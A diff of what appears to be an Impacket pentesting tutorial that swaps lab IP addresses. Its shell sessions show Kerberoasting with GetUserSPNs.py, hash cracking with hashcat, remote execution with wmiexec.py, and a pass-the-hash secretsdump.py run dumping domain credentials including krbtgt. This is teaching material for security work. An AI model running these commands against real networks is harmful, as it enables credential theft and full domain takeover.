@@ -30,7 +30,7 @@ The scripts share a credential syntax: `domain/user:password@target`. Kerberoast
 operator@kali:~$ GetUserSPNs.py corp.local/jdoe:Summer2024 -request
 ServicePrincipalName  Name        Hash
 MSSQLSvc/db01         svc_sql     $krb5tgs$23$*svc_sql*...   ← crack with hashcat -m 13100
-operator@kali:~$ wmiexec.py corp.local/svc_sql:CrackedPass@10.0.0.30
+operator@kali:~$ wmiexec.py corp.local/svc_sql:CrackedPass@10.10.20.30
 [*] SMBv3.0 dialect used
 C:\> whoami
 corp\svc_sql
@@ -44,7 +44,7 @@ The most important Impacket concept is **pass-the-hash** — and it reveals how 
 
 ```shell-session
 # You have the NT hash but NEVER cracked the password
-operator@kali:~$ secretsdump.py -hashes :aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/admin@10.0.0.10
+operator@kali:~$ secretsdump.py -hashes :aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/admin@10.10.20.10
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 corp.local\krbtgt:502:aad3b...:1a59b...
 ```
